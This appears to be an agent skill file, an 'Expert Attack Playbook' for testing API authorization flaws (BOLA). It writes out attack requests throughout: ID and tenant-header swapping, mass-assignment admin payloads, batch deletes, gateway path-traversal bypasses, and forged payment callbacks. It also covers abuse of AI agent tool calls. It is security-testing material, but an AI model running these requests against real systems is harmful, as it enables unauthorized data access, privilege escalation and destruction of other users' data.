---
name: api-authorization-and-bola
description: >-
  API-specific authorization and BOLA testing playbook. Use when REST APIs expose object references in paths, JSON bodies, custom headers, cursors, or ETags, or when version drift, batch endpoints, multi-tenancy, and soft-delete create authorization gaps not covered by generic IDOR testing.
---

# SKILL: API Authorization and BOLA — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: API-layer authorization attacks beyond generic IDOR. Covers RESTful path/body/header/cursor object references, nested sub-resource gaps, API version authz drift, mass assignment via OpenAPI field diff, batch/collection BOLA, multi-tenant isolation, soft-delete and encoded-ID edge cases, and gateway-vs-backend inconsistencies. Cross-links to the generic IDOR skill for foundational patterns.

## 0. RELATED ROUTING

This skill covers API/REST/JSON-specific authorization surfaces. For foundational patterns, load:

- [idor broken object authorization](../idor-broken-object-authorization/SKILL.md) for generic IDOR methodology, A-B testing, ID-type prediction, ORM filter injection, and BFLA
- [graphql and hidden parameters](../graphql-and-hidden-parameters/SKILL.md) for GraphQL authorization, aliasing, and batching
- [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md) for token trust, claim tampering, and rate-limit bypass
- [api recon and docs](../api-recon-and-docs/SKILL.md) for OpenAPI/Swagger discovery and endpoint enumeration

---

## 1. SCOPE & DIFFERENTIATION

The sibling skill `idor-broken-object-authorization` covers generic IDOR: A-B testing, parameter pollution, BFLA, mass assignment basics, and ORM filter injection. **This skill targets authorization weaknesses unique to API/REST/JSON contexts** — it does not repeat the foundational methodology.

| API-Specific Surface | Why Unique to APIs |
|---|---|
| RESTful path params `/api/v1/users/{id}` | Routing layer may strip/rewrite IDs before authz middleware |
| JSON body nested IDs | Deeply nested IDs bypass flat-field validation |
| Custom headers `X-Account-Id` | Tenancy headers trusted without token binding |
| Pagination cursors | Cursors encode object IDs — decode to reference arbitrary objects |
| ETag / If-Match | Concurrency headers reference objects by hash without ID check |
| API version drift | v2 patched but v1 still deployed and routable |
| Batch endpoints | `/bulk`, `/export?ids=` iterate without per-item ownership checks |
| Soft-delete flags | `deleted=true` objects skip ownership checks |
| Gateway vs backend | Gateway authorizes one path; backend rewrites to another |

---

## 2. API OBJECT REFERENCE SURFACES

Beyond the obvious URL path param, APIs leak object references in locations that frequently bypass authz middleware.

### RESTful Path Parameters — Child Without Parent Check

```http
GET /api/v1/users/12345/devices          # checks user 12345 ownership
GET /api/v1/users/12345/devices/9876     # checks device 9876 — but NOT against user 12345
```

### JSON Body Nested IDs

```http
POST /api/v1/orders HTTP/1.1
Content-Type: application/json

{
  "order": {
    "items": [{"sku": "A1", "qty": 1}],
    "shipping": {"address_id": 5678},
    "billing": {"account_id": 9999}
  }
}
```

Authz may validate `order` ownership but not `address_id` or `account_id`. Replace `address_id` with another user's address ID.

### Custom Tenant / User Headers

```http
GET /api/v1/account/billing HTTP/1.1
Authorization: Bearer <UserA_token>
X-Account-Id: 9988
X-User-Id: 12345
```

If the API trusts `X-Account-Id` without binding it to the bearer token's claims, swap the header to access any user.

### Pagination Cursor Encoded IDs

```bash
echo "eyJpZCI6MTAwfQ==" | base64 -d
# → {"id":100}

# Modify and re-encode:
echo -n '{"id":10001}' | base64
# → eyJpZCI6MTAwMDF9
```

```http
GET /api/v1/users?cursor=eyJpZCI6MTAwMDF9 HTTP/1.1
```

### ETag / If-Match Object Reference

```http
PUT /api/v1/orders/12345 HTTP/1.1
If-Match: "etag_of_victim_order"
```

If the API resolves `If-Match` to an object and the ETag was leaked or guessable, the update applies to the ETag's object, not the path ID.

---

## 3. NESTED & SUB-RESOURCE AUTHORIZATION GAPS

REST APIs model relationships as nested paths. Parent authorization is frequently checked but child ownership is not.

### Parent-Child Authorization Gap

```http
GET /api/v1/orgs/55/users/301/profile     # checks: is user 301 in org 55?
GET /api/v1/users/301/profile              # direct access — may skip org check
GET /api/orgs/55/users/301                 # no "v1" prefix — legacy route, weaker authz?
```

### Relationship Chain IDOR

The API checks permission on object A but not on referenced objects:

```http
# UserA can read their own message:
GET /api/v1/messages/8001                 # checks ownership of message 8001

# Access attachment directly:
GET /api/v1/attachments/4502              # does NOT check message ownership
GET /api/v1/comments/7788/author          # leaks author profile even if you cannot see the post
GET /api/v1/transactions/9001/metadata     # metadata exposed without ownership check
```

**Test**: enumerate every sub-resource endpoint and access it directly via its own ID, bypassing the parent.

---

## 4. HTTP METHOD ABUSE (API-SPECIFIC)

Authz middleware is frequently written per-HTTP-method. When `GET` is protected, other verbs take different code paths:

```http
GET    /api/v1/users/12345          ← 403 Forbidden
PUT    /api/v1/users/12345          ← 200 (different handler, no authz)
PATCH  /api/v1/users/12345          ← 200 (partial update — most commonly missed)
DELETE /api/v1/users/12345          ← 204 (deletion allowed)
HEAD   /api/v1/users/12345          ← 200 (status confirms object exists)
OPTIONS /api/v1/users/12345         ← reveals allowed methods, may bypass auth
```

### PATCH — The Most Missed Verb

```http
PATCH /api/v1/users/12345 HTTP/1.1
Content-Type: application/json

{"email": "attacker@evil.com"}
```

PATCH is often a generic "apply JSON to model" handler that does not re-check ownership.

### Method Override Header

```http
POST /api/v1/users/12345 HTTP/1.1
X-HTTP-Method-Override: DELETE
```

Gateway sees `POST` (allowed) but backend resolves it to `DELETE` — authz bypassed.

---

## 5. API VERSION AUTHORIZATION DRIFT

APIs evolve. v2 may fix a BOLA, but v1 remains deployed and routable.

```http
GET /api/v2/users/12345          ← 403 (fixed)
GET /api/v1/users/12345          ← 200 (v1 not patched!)

GET /api/internal/users/12345          ← weaker or no authz
GET /api/legacy/v1/orders/9001         ← pre-redesign, still routed
GET /api/v1/users/12345?internal=true  ← query flag bypasses authz
```

**Discovery**: fuzz version prefixes (`v0`, `v1`, `v2`, `internal`, `legacy`, `beta`, `staging`, `rc`) against every confirmed BOLA endpoint.

---

## 6. MASS ASSIGNMENT (API BODY-SPECIFIC)

The generic IDOR skill covers mass assignment basics. This section focuses on API-specific field discovery.

### Extracting Hidden Fields from OpenAPI

```bash
curl -s https://target.com/api/openapi.json | \
  jq '.paths | to_entries[] | .value | to_entries[] |
    select(.key | test("post|put|patch")) |
    .value.requestBody.content["application/json"].schema'
```

Fields present in the spec but absent in the UI are hidden writable targets.

### Admin Create vs User Register Field Diff

```http
# Normal registration (UI sends):
POST /api/v1/register
{"username":"attacker","email":"a@evil.com","password":"P@ss"}

# Admin create (from JS or OpenAPI):
POST /api/v1/admin/users
{"username":"x","email":"x@x.com","password":"P@ss",
 "role":"admin","isAdmin":true,"verified":true,"tier":"premium"}
```

**Diff the payloads** — fields in admin but not register are mass-assignment targets:

```http
POST /api/v1/register
{
  "username": "attacker", "email": "a@evil.com", "password": "P@ss",
  "role": "admin", "isAdmin": true, "verified": true,
  "tier": "premium", "permissions": ["read","write","admin"], "org": "root"
}
```

### Bulk Update Endpoints

```http
PUT /api/v1/users/bulk
[{"id": 12345, "role": "admin"}, {"id": 12346, "role": "admin"}]
```

Bulk endpoints validate the **request** but skip per-item ownership. Add another user's ID.

---

## 7. BATCH & COLLECTION ENDPOINT BOLA

```http
# Bulk fetch — cross-user data:
POST /api/v1/orders/bulk
{"ids": [9001, 9002, 9003, 9004]}

# Export endpoints:
GET /api/v1/export?ids=9001,9002,9003
GET /api/v1/search?q=type:invoice&owner=all

# Batch delete — destroying others' objects:
POST /api/v1/resources/batch-delete
{"ids": [5001, 5002, 5003]}
```

If the API checks "is this a valid batch" but not "does the caller own all items", cross-user access is possible.

---

## 8. MULTI-TENANT API ISOLATION

### Tenant Header Switching

```http
GET /api/v1/data HTTP/1.1
Authorization: Bearer <TenantA_token>
X-Tenant-Id: tenant_B       ← swap tenant with TenantA's token
```

### Cross-Tenant Read/Write

```http
GET /api/v1/orgs/tenant_B/resources/7777     # read another tenant
POST /api/v1/orgs/tenant_B/resources          # write to another tenant
```

### Shared Resource Over-Privilege

```http
GET /api/v1/templates/55     # shared resource — read OK
PUT /api/v1/templates/55     # does API check write permission, or just read?
```

---

## 9. SOFT-DELETE & ARCHIVED OBJECT ACCESS

Soft-deleted objects often bypass ownership checks because only the "active" authz path is tested.

```http
GET /api/v1/orders/9001                    ← 404 (soft-deleted, hidden)
GET /api/v1/orders/9001?include_deleted=true   ← 200?
GET /api/v1/orders/9001?status=deleted         ← 200?
GET /api/v1/archive/orders/9001                 ← 200?
```

---

## 10. UUID & ENCODED ID HANDLING

### Base64-Encoded JSON IDs

```bash
echo "eyJpZCI6MTAwMDF9" | base64 -d   # → {"id":10001}
echo -n '{"id":10002}' | base64         # → eyJpZCI6MTAwMDJ9
```

### Hashids

```bash
python3 -c "from hashids import Hashids; h=Hashids(salt=''); print(h.decode('jR'))"
# → (1,) — if salt is weak, decode victim IDs or encode sequential IDs
```

### Predictable UUIDv1

UUIDv1 encodes timestamp + MAC address — adjacent UUIDs are calculable:

```bash
python3 -c "
import uuid; u = uuid.UUID('550e8400-e29b-11d4-a716-446655440000')
print(f'time: {u.time}  node: {u.node:#x}')
"
```

### Collecting UUIDs From Own Responses

APIs return other users' UUIDs in list/search/export responses — collect every UUID for direct-access BOLA testing.

---

## 11. RESPONSE FIELD OVER-EXPOSURE & GATEWAY-BACKEND MISMATCH

### Response Field Over-Exposure

```http
GET /api/v1/users/12346?fields=email,ssn,apiKey     # request sensitive fields for other users
GET /api/v1/users/12346?include=sensitive
```

If the API supports field selection, test whether sensitive fields can be explicitly requested for other users.

### Path Normalization Mismatch (Gateway vs Backend)

```http
GET /api/v1/users/12345          ← gateway: 403
GET /api/v1/users/12345/         ← gateway: routes differently, backend: 200
GET /api/v1//users//12345        ← gateway: strips slashes, backend: 200
GET /api/v1/public/../users/12345   ← gateway: matches /public/* (no auth), backend: normalizes
```

---

## 12. 2026 EMERGING TECHNIQUES

### 12.1 LLM API Authorization Gaps (OpenAI-Compatible)

OpenAI-compatible LLM gateways (vLLM, LiteLLM, OpenLLM, self-hosted control planes) frequently authorize on **API-key validity only**, never on resource ownership. Any valid key reads every tenant's data:
```http
# Two unrelated users, two valid API keys — same backend, no ownership check:
GET /v1/threads/thread_abc123/messages   Authorization: Bearer sk-userA-...
# → 200  (user A's thread)

GET /v1/threads/thread_abc123/messages   Authorization: Bearer sk-userB-...
# → 200  (still returns user A's thread — key valid, ownership unchecked)
```
- **Conversation history / vector stores**: `/v1/threads/{id}`, `/v1/vector_stores/{id}/files`, `/v1/assistants/{id}` are IDOR'd against the key alone; enumerate `thread_*`/`vs_*` IDs across accounts.
- **Agent tool-calling decoupled authz**: an agent's tool-calling layer invokes APIs with the agent's umbrella key; the tool execution path never re-checks that the calling user owns the target object. A prompt-injected agent performs BOLA on behalf of the victim.
- **No scope binding on API keys**: LLM integration keys carry flat access (`Organization Member`) with no per-resource/per-verb scopes, so key theft = full data access. Confirm by swapping keys between users on object-bound endpoints.

### 12.2 API Gateway <-> Backend Authorization Split

When the gateway enforces authz but the backend trusts the gateway, direct backend access bypasses everything:
- **Direct backend reach**: if the backend is reachable (internal LB/ALB without auth, no `X-Forwarded-For` gating), call `/api/v1/users/{id}` with no token — the backend assumes the gateway already authorized.
- **v1/v2 policy drift**: `/v1/users/{id}` enforces ownership, `/v2/users/{id}` (refactored) skips it — diff every version prefix.
- **X-HTTP-Method-Override inconsistency**: the gateway authorizes `GET` but the backend honors `X-HTTP-Method-Override: DELETE` and executes the privileged verb without re-authorizing the override.
- **Path normalization mismatch**: gateway matches `/public/*` (no auth), backend normalizes `/public/../users/12345` → `/users/12345` (see §11); also `/api/v1/users/12345/`, `/api/v1//users//12345`, `%2f`-encoded variants.

### 12.3 Multi-Tenant Isolation — Claim vs DB Trust

- **tenant_id in JWT claim is tamperable if trusted over DB**: if the API filters by `tenant_id` from the token claim instead of deriving it from the authenticated session's DB record, a forged/modified claim (or key-confusion token) cross-tenant reads/writes. Tamper `{"tid":"tenantA"}`→`{"tid":"tenantB"}` on a token whose signature is not strictly re-verified.
- **X-Tenant-Id in Serverless**: serverless functions (Lambda/Cloud Run) rebuild tenant context from `X-Tenant-Id` because they lack sticky sessions; the header is attacker-controlled and not cross-checked against the token → set `X-Tenant-Id: tenantB` with tenantA's token.

### 12.4 Bulk / Collection Endpoint BOLA

Single-object authorization is often enforced but collection/bulk endpoints are not — one request carries many IDs and only ownership of the request (not each object) is checked:
```http
POST /api/v1/users/me/export
Content-Type: application/json
{"ids": ["my_id", "victim_id_1", "victim_id_2"]}
# → returns data for all three; per-object ownership never re-checked

POST /api/v1/orders/bulk
{"ids": ["ord_mine", "ord_victim"]}
```
- **GraphQL batching BOLA**: a single batched request `[ {query{user(id:VICTIM){email}}}, {query{user(id:ME){email}}} ]` mixes IDs; per-object authz on the batch (not each entry) leaks cross-user records.
- **`/export?ids=` / `/search?owner=`** with comma/wildcard ID lists — test mixed own+victim IDs on every bulk/export/search endpoint.

### 12.5 Payment Callback BOLA (2026)

CVE-2026-41432 (Stripe Webhook empty-secret HMAC bypass) enables cross-gateway `trade_no` reuse: a confirmed `trade_no` accepted by gateway A is replayed at gateway B because the callback signature is not bound to a single gateway/merchant context. The BOLA angle — the order object keyed by `trade_no` is reachable from any callback handler:
```http
POST /api/v1/payment/callback
{"trade_no":"2026CONFIRMED_ORDER","status":"paid","gateway":"B"}
# Forged (empty-HMAC) callback marks victim's order paid on gateway B
```

### 12.6 2026 BOLA Emerging Checklist

```
□ LLM API: swap two users' keys on /v1/threads/{id}, /v1/vector_stores/{id}/files, /v1/assistants/{id}
□ Confirm agent tool-calling re-checks ownership per tool invocation
□ Check LLM keys carry per-resource/per-verb scopes (not flat org access)
□ Reach backend directly (internal LB/ALB) with no token — does it assume gateway auth?
□ Diff authz across v1/v2/internal/beta prefixes on every BOLA endpoint
□ Test X-HTTP-Method-Override at gateway vs backend (GET->DELETE/PATCH)
□ Test path normalization: /public/../, //, %2f, trailing slash between gateway and backend
□ Tamper tenant_id claim; verify API trusts claim over DB-derived tenant
□ Set X-Tenant-Id to another tenant with victim token (serverless context rebuild)
□ Bulk/export/search: mix own + victim IDs; GraphQL batch with mixed user IDs
□ Replay trade_no across payment gateways; test empty-HMAC forged callbacks
```

---

## 13. 2026 ADVANCED — 授权与 BOLA 新向量

### 13.1 GraphQL 嵌套 BOLA（深层嵌套对象授权、Federation 子图 BOLA）

**深层嵌套对象授权缺失**：GraphQL 查询深度嵌套时，每一层的对象授权可能独立检查但跨层关系未验证：

```graphql
# 层 1 授权通过 → 层 2 子对象未重新检查
query {
  user(id: "ME") {           # 授权: 当前用户 ✓
    orders {                  # 授权: 我的订单 ✓
      items {                 # 授权: ❌ 未检查 item 属于谁的 order
        product { reviews }   # 越权读取其他用户的产品评论
      }
    }
  }
}

# 攻击: 替换 order.id 为受害者的 order_id
query {
  user(id: "ME") {
    order(id: "victim_order_id") {  # 层 1 授权 ME，但 order 不属于 ME
      shippingAddress { phone }     # 泄露受害者地址和电话
    }
  }
}
```

**Federation 子图 BOLA**：Apollo Federation 中子图各自实现授权，但 `_entities` 查询的 `representations` 参数可绕过网关层授权：

```graphql
# Federation 子图直接查询 — 绕过网关授权
query Entities($rep: [_Any!]!) {
  _entities(representations: $rep) {
    ... on User {
      email        # 子图未重新验证调用者是否有权读取该 User
      ssn
    }
  }
}
# variables: {"rep": [{"__typename":"User","id":"victim_id"}]}
```

### 13.2 API 网关授权不一致（网关 vs 后端授权差异、路径重写绕过）

**网关 vs 后端授权差异**：网关配置的授权策略与后端实际实现不一致，存在安全间隙：

```text
网关规则: /api/v1/admin/* → 需要 admin 角色
后端路由: /api/v1/admin/../users/{id} → 路径归一化后为 /api/v1/users/{id}
→ 网关匹配 /admin/* 需 admin, 但后端归一化后执行 /users/{id} 需普通权限
→ 普通用户通过路径穿越访问 admin 端点
```

**路径重写绕过**：网关的路径重写规则可被利用绕过授权：

```http
# 网关规则: /public/* 不需认证; /api/* 需要 Bearer token
# 重写规则: /public/(.*) → /api/$1

GET /public/users/12345          # 网关: /public/* → 不验证 → 重写为 /api/users/12345
→ 后端收到 /api/users/12345 但无 Authorization header
→ 若后端信任网关已认证 → 返回数据（BOLA）

# 双重编码绕过
GET /public/%2561pi/users/12345  # %25 → %, 重写后 %61pi → api
```

### 13.3 UUID 枚举（可预测 UUID v1/v6、NanoID 碰撞、Snowflake ID 反推）

**UUID v1 时间戳泄露**：UUID v1 包含 60 位时间戳和 MAC 地址，可预测生成时间和设备，并推断相邻 UUID：

```python
# UUID v1 结构: time_low-time_mid-time_hi-version:clock_seq:node
import uuid
u = uuid.uuid1()
# 从 UUID v1 提取时间: 可精确到 100ns
# 从 node 字段提取 MAC 地址: 泄露物理地址
# 相邻 UUID 仅差 1 个时间计数 → 可枚举
```

**NanoID 碰撞**：NanoID 默认 21 字符（URL-safe alphabet），但缩短至 8-10 字符时碰撞概率显著上升，攻击者可枚举或猜测：

```text
NanoID 8 字符: 字母表 64, 空间 64^8 = 2.8 × 10^14
→ 在高并发 API 中, 短 NanoID 可能在数百万次请求内碰撞
→ 碰撞的 ID 指向其他用户的对象 → BOLA
```

**Snowflake ID 反推**：Twitter/Discord Snowflake ID 结构为 timestamp(41) + worker_id(10) + sequence(12)，可反推创建时间和递增序列：

```python
# Snowflake ID 反推
def decode_snowflake(snowflake_id, epoch=1288834974657):
    timestamp = (snowflake_id >> 22) + epoch
    worker_id = (snowflake_id >> 12) & 0x3FF
    sequence = snowflake_id & 0xFFF
    return timestamp, worker_id, sequence
# 已知一个 Snowflake ID → 推断同时间窗口的其他 ID → BOLA 枚举
```

### 13.4 AI Agent 端点授权（A2A 协议授权、MCP 工具调用授权、Agent 角色混淆）

**A2A 协议授权缺失**：Agent-to-Agent 协议中 Agent A 调用 Agent B 的端点时，授权可能被跳过：

```text
Agent A (用户 U1) → Agent B (管理用户 U2 的资源)
→ A2A 调用: Agent A 请求 Agent B 操作 U2 的资源
→ 若 Agent B 信任 Agent A 的请求不重新验证 → U1 越权操作 U2 的资源
```

**MCP 工具调用授权**：MCP 工具调用时，工具端点的授权可能使用 Agent 的身份而非最终用户的身份：

```json
// MCP 工具调用 — 授权混淆
{"tool":"delete_file","params":{"file_id":"victim_file"}}
// 工具端点验证: Agent 的 Service Account (有删除权限) ✓
// 但未验证: 最终用户是否有权删除该文件 ❌
```

**Agent 角色混淆**：多 Agent 系统中 Agent 角色边界模糊，低权限 Agent 通过委派调用高权限 Agent 的操作端点：

```text
Agent A (read-only role) → A2A → Agent B (admin role) → 执行删除操作
审计日志: Agent B 执行了删除, 但实际触发者是 Agent A
→ 权限隔离形同虚设, Agent A 通过委派获得 admin 能力
```

### 13.5 2026 BOLA 自动化检测（DAST / IAST / AI 辅助）

| 工具/方法 | 类型 | BOLA 检测能力 | 2026 增强 |
|-----------|------|-------------|-----------|
| OWASP ZAP | DAST | 被动扫描 IDOR 模式 | 新增 GraphQL 深度检测插件 |
| Burp Suite Pro | DAST | 主动扫描参数替换 | BChecks 自定义 BOLA 规则 |
| Nuclei | DAST | 模板化 IDOR 检测 | 新增 AI API BOLA 模板 |
| Akto / APIssec | DAST | API 专用 BOLA 检测 | GraphQL Federation 子图检测 |
| IAST (Contrast/Snyk) | IAST | 运行时数据流追踪 | 覆盖 Agent 工具调用链 |
| AI 辅助 | LLM | 语义理解授权逻辑 | 自动生成 BOLA 测试用例 |

**AI 辅助 BOLA 发现**：利用 LLM 分析 OpenAPI 规范和业务逻辑，自动推断授权缺失点：

```text
AI 辅助流程:
1. 输入: OpenAPI spec + 业务描述 + 样本请求/响应
2. LLM 分析: 识别所有对象引用端点 (/{resource}/{id})
3. 推断: 哪些端点可能缺失对象级授权
4. 生成: 参数替换测试用例 (swap own_id ↔ victim_id)
5. 验证: 自动执行并比较响应差异
```

```yaml
# Nuclei BOLA 检测模板 — AI API
id: ai-api-bola
info:
  name: AI API BOLA Detection
  severity: high
http:
  - raw:
      - |
        GET /v1/threads/{{victim_thread_id}} HTTP/1.1
        Authorization: Bearer {{my_token}}
    matchers:
      - type: word
        words: ["messages", "created_at"]
```

### 13.6 2026 BOLA 检测清单

```
□ GraphQL: 测试深层嵌套查询每层对象授权
□ Federation: 直接查询 _entities 绕过网关授权
□ 网关 vs 后端: 测试路径归一化差异 (/../, //, %2f)
□ 路径重写: 测试 /public/* → /api/* 重写绕过
□ UUID v1: 从 UUID 提取时间戳/MAC, 推断相邻 ID
□ NanoID: 测试短 ID 碰撞和枚举
□ Snowflake: 反推时间戳和序列, 枚举同窗口 ID
□ A2A: 测试 Agent 间端点是否重新验证最终用户授权
□ MCP: 验证工具端点使用最终用户身份而非 Agent 身份
□ Agent 角色: 确认低权限 Agent 不能委派调用高权限操作
□ DAST: 使用 ZAP/Burp/Nuclei 自动化扫描 BOLA
□ IAST: 部署运行时数据流追踪覆盖工具调用链
□ AI 辅助: 使用 LLM 分析 OpenAPI 推断授权缺失
```

---

## 14. NEXT ROUTING

- For JWT bearer token, claim tampering, and rate-limit bypass: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)
- For GraphQL batching and hidden parameters: [graphql and hidden parameters](../graphql-and-hidden-parameters/SKILL.md)
- For foundational IDOR/BOLA methodology, ORM filter injection, BFLA: [idor broken object authorization](../idor-broken-object-authorization/SKILL.md)
- For OpenAPI/Swagger discovery: [api recon and docs](../api-recon-and-docs/SKILL.md)
- For 401/403 bypass: [401 403 bypass techniques](../401-403-bypass-techniques/SKILL.md)

---

## 15. TESTING CHECKLIST

```
□ Decode pagination cursors (base64) and modify embedded object IDs
□ Test custom headers (X-User-Id, X-Account-Id, X-Tenant-Id) — swap values
□ Access sub-resources directly by their own ID, bypassing the parent path
□ For each endpoint, test GET/PUT/PATCH/DELETE/HEAD/OPTIONS — focus on PATCH
□ Fuzz version prefixes (v1, v2, internal, legacy, beta) on every BOLA endpoint
□ Download OpenAPI spec and diff admin-create vs user-register field sets
□ Test bulk/batch endpoints with mixed IDs (own + victim)
□ Test export/search endpoints with wildcard or cross-user IDs
□ Swap tenant header (X-Tenant-Id) and test cross-tenant read/write
□ Test soft-deleted/archived objects via ?include_deleted=true, ?status=deleted
□ Decode base64/hashid/UUIDv1 encoded IDs and enumerate neighbors
□ Collect all UUIDs from list/search responses for BOLA testing
□ Request sensitive fields explicitly (?fields=ssn,apiKey) for other users
□ Test path normalization mismatches between gateway and backend
□ Test X-HTTP-Method-Override to bypass per-method authz
□ Verify If-Match/ETag cannot reference another user's object
```
